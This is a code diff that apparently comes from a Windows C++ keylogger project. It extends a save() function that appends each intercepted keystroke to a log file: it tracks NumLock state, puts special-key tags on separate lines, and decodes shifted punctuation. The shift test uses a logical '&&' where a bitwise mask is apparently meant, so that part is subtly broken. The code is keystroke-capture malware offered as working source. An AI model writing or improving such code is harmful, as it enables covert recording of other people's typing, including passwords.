@@ -33,6 +33,8 @@
 #define MAX_INPUT_LEN 80
 using namespace std;
 
+bool numUnlocked = true;
+
 void viewOptions();
 bool authentication_ret(char*, char*);
 void authentication();
@@ -1016,59 +1018,62 @@ int save(int _key, char const *file)
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen (file,"a+");
     if( _key == VK_SHIFT)
-        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+        fprintf(OUTPUT_FILE, "%s", "\n[SHIFT]\n");
     else if( _key == VK_LBUTTON)
-        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
+        fprintf(OUTPUT_FILE, "%s", "\n[LBUTTON]\n");
     else if( _key == VK_CANCEL)
-        fprintf(OUTPUT_FILE, "%s", "[CANCEL]");
+        fprintf(OUTPUT_FILE, "%s", "\n[CANCEL]\n");
     else if( _key == VK_RETURN)
-        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
+        fprintf(OUTPUT_FILE, "%s", "\n[RETURN]\n");
     else if( _key == VK_ESCAPE)
-        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+        fprintf(OUTPUT_FILE, "%s", "\n[ESCAPE]\n");
     else if( _key == VK_BACK)
-        fprintf(OUTPUT_FILE, "%s", "[BACK]");
+        fprintf(OUTPUT_FILE, "%s", "\n[BACK]\n");
     else if( _key == VK_SHIFT)
-        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+        fprintf(OUTPUT_FILE, "%s", "\n[SHIFT]\n");
     else if( _key == VK_RBUTTON)
-        fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
+        fprintf(OUTPUT_FILE, "%s", "\n[RBUTTON]\n");
     else if( _key == VK_CAPITAL)
-        fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
+        fprintf(OUTPUT_FILE, "%s", "\n[CAPSLOCK]\n");
     else if( _key == VK_TAB)
-        fprintf(OUTPUT_FILE, "%s", "[TAB]");
+        fprintf(OUTPUT_FILE, "%s", "\n[TAB]\n");
     else if( _key == VK_UP)
-        fprintf(OUTPUT_FILE, "%s", "[UP_ARROW]");
+        fprintf(OUTPUT_FILE, "%s", "\n[UP_ARROW]\n");
     else if( _key == VK_DOWN)
-        fprintf(OUTPUT_FILE, "%s", "[DOWN_ARROW]");
+        fprintf(OUTPUT_FILE, "%s", "\n[DOWN_ARROW]\n");
     else if( _key == VK_LEFT)
-        fprintf(OUTPUT_FILE, "%s", "[LEFT_ARROW]");
+        fprintf(OUTPUT_FILE, "%s", "\n[LEFT_ARROW]\n");
     else if( _key == VK_RIGHT)
-        fprintf(OUTPUT_FILE, "%s", "[RIGHT_ARROW]");
+        fprintf(OUTPUT_FILE, "%s", "\n[RIGHT_ARROW]\n");
     else if( _key == VK_CONTROL)
-        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
+        fprintf(OUTPUT_FILE, "%s", "\n[CTRL]\n");
     else if( _key == 190)
         fprintf(OUTPUT_FILE, "%s", ".");
     else if( _key == VK_HOME)
-        fprintf(OUTPUT_FILE, "%s", "[HOME]");
+        fprintf(OUTPUT_FILE, "%s", "\n[HOME]\n");
     else if( _key == VK_INSERT)
-        fprintf(OUTPUT_FILE, "%s", "[INSERT]");
+        fprintf(OUTPUT_FILE, "%s", "\n[INSERT]\n");
     else if( _key == VK_PAUSE)
-        fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
+        fprintf(OUTPUT_FILE, "%s", "\n[PAUSE]\n");
     else if( _key == VK_SELECT)
-        fprintf(OUTPUT_FILE, "%s", "[SELECT]");
+        fprintf(OUTPUT_FILE, "%s", "\n[SELECT]\n");
     else if( _key == VK_HELP)
-        fprintf(OUTPUT_FILE, "%s", "[HELP]");
+        fprintf(OUTPUT_FILE, "%s", "\n[HELP]\n");
     else if( _key == VK_EXECUTE)
-        fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
+        fprintf(OUTPUT_FILE, "%s", "\n[EXECUTE]\n");
     else if( _key == VK_DELETE)
-        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
+        fprintf(OUTPUT_FILE, "%s", "\n[DELETE]\n");
     else if( _key == VK_CLEAR)
-        fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
+        fprintf(OUTPUT_FILE, "%s", "\n[CLEAR]\n");
     else if( _key == VK_NUMLOCK)
-        fprintf(OUTPUT_FILE, "%s", "[NumLock]");
+    {
+        fprintf(OUTPUT_FILE, "%s", "\n[NumLock]\n");
+        numUnlocked = !numUnlocked;
+    }
     else if( _key == VK_SCROLL)
-        fprintf(OUTPUT_FILE, "%s", "[SCROLL]");
+        fprintf(OUTPUT_FILE, "%s", "\n[SCROLL]\n");
     else if( _key == VK_END)
-        fprintf(OUTPUT_FILE, "%s", "[END]");
+        fprintf(OUTPUT_FILE, "%s", "\n[END]\n");
     else if( _key == VK_DIVIDE)
         fprintf(OUTPUT_FILE, "%s", "/");
     else if( _key == VK_MULTIPLY)
@@ -1076,60 +1081,136 @@ int save(int _key, char const *file)
     else if( _key == VK_ADD)
         fprintf(OUTPUT_FILE, "%s", "+");
     else if( _key == VK_PRIOR)
-        fprintf(OUTPUT_FILE, "%s", "[PageUp]");
+        fprintf(OUTPUT_FILE, "%s", "\n[PageUp]\n");
     else if( _key == VK_NEXT)
-        fprintf(OUTPUT_FILE, "%s", "[PageDown]");
+        fprintf(OUTPUT_FILE, "%s", "\n[PageDown]\n");
     else if( _key == VK_LEFT)
-        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+        fprintf(OUTPUT_FILE, "%s", "\n[LEFT]\n");
     else if( _key == VK_RIGHT)
-        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+        fprintf(OUTPUT_FILE, "%s", "\n[RIGHT]\n");
     else if( _key == VK_UP)
-        fprintf(OUTPUT_FILE, "%s", "[UP]");
-    else if( _key == VK_NUMPAD0)
+        fprintf(OUTPUT_FILE, "%s", "\n[UP]\n");
+    else if( _key == VK_NUMPAD0 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "0");
-    else if( _key == VK_NUMPAD1)
+    else if( _key == VK_NUMPAD1 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "1");
-    else if( _key == VK_NUMPAD2)
+    else if( _key == VK_NUMPAD2 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "2");
-    else if( _key == VK_NUMPAD3)
+    else if( _key == VK_NUMPAD3 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "3");
-    else if( _key == VK_NUMPAD4)
+    else if( _key == VK_NUMPAD4 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "4");
-    else if( _key == VK_NUMPAD5)
+    else if( _key == VK_NUMPAD5 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "5");
-    else if( _key == VK_NUMPAD6)
+    else if( _key == VK_NUMPAD6 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "6");
-    else if( _key == VK_NUMPAD7)
+    else if( _key == VK_NUMPAD7 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "7");
-    else if( _key == VK_NUMPAD8)
+    else if( _key == VK_NUMPAD8 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "8");
-    else if( _key == VK_NUMPAD9)
+    else if( _key == VK_NUMPAD9 && numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "9");
     else if( _key == VK_F1)
-        fprintf(OUTPUT_FILE, "%s", "[F1]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F1]\n");
     else if( _key == VK_F2)
-        fprintf(OUTPUT_FILE, "%s", "[F2]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F2]\n");
     else if( _key == VK_F3)
-        fprintf(OUTPUT_FILE, "%s", "[F3]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F3]\n");
     else if( _key == VK_F4)
-        fprintf(OUTPUT_FILE, "%s", "[F4]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F4]\n");
     else if( _key == VK_F5)
-        fprintf(OUTPUT_FILE, "%s", "[F5]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F5]\n");
     else if( _key == VK_F6)
-        fprintf(OUTPUT_FILE, "%s", "[F6]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F6]\n");
     else if( _key == VK_F7)
-        fprintf(OUTPUT_FILE, "%s", "[F7]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F7]\n");
     else if( _key == VK_F8)
-        fprintf(OUTPUT_FILE, "%s", "[F8]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F8]\n");
     else if( _key == VK_F9)
-        fprintf(OUTPUT_FILE, "%s", "[F9]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F9]\n");
     else if( _key == VK_F10)
-        fprintf(OUTPUT_FILE, "%s", "[F10]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F10]\n");
     else if( _key == VK_F11)
-        fprintf(OUTPUT_FILE, "%s", "[F11]");
+        fprintf(OUTPUT_FILE, "%s", "\n[F11]\n");
     else if( _key == VK_F12)
-        fprintf(OUTPUT_FILE, "%s", "[F12]");
-
+        fprintf(OUTPUT_FILE, "%s", "\n[F12]\n");
+    else if( _key == VK_OEM_2)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "?");
+        else
+            fprintf(OUTPUT_FILE, "%s", "/");
+    }
+    else if( _key == VK_OEM_3)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "~");
+        else
+            fprintf(OUTPUT_FILE, "%s", "`");
+    }
+    else if( _key == VK_OEM_4)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "{");
+        else
+            fprintf(OUTPUT_FILE, "%s", "[");
+    }
+    else if( _key == VK_OEM_5)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "|");
+        else
+            fprintf(OUTPUT_FILE, "%s", "\\");
+    }
+    else if( _key == VK_OEM_6)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "}");
+        else
+            fprintf(OUTPUT_FILE, "%s", "]");
+    }
+    else if( _key == VK_OEM_7)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "\\");
+        else
+            fprintf(OUTPUT_FILE, "%s", "'");
+    }
+    else if( _key == 0xBC)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "<");
+        else
+            fprintf(OUTPUT_FILE, "%s", ",");
+    }
+    else if( _key == 0xBE)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", ">");
+        else
+            fprintf(OUTPUT_FILE, "%s", ".");
+    }
+    else if( _key == 0xBA)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", ":");
+        else
+            fprintf(OUTPUT_FILE, "%s", ";");
+    }
+    else if( _key == 0xBD)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "_");
+        else
+            fprintf(OUTPUT_FILE, "%s", "-");
+    }
+    else if( _key == 0xBB)
+    {
+        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+            fprintf(OUTPUT_FILE, "%s", "+");
+        else
+            fprintf(OUTPUT_FILE, "%s", "=");
+    }
     else
         fprintf(OUTPUT_FILE,"%s", &_key);
     fclose(OUTPUT_FILE);
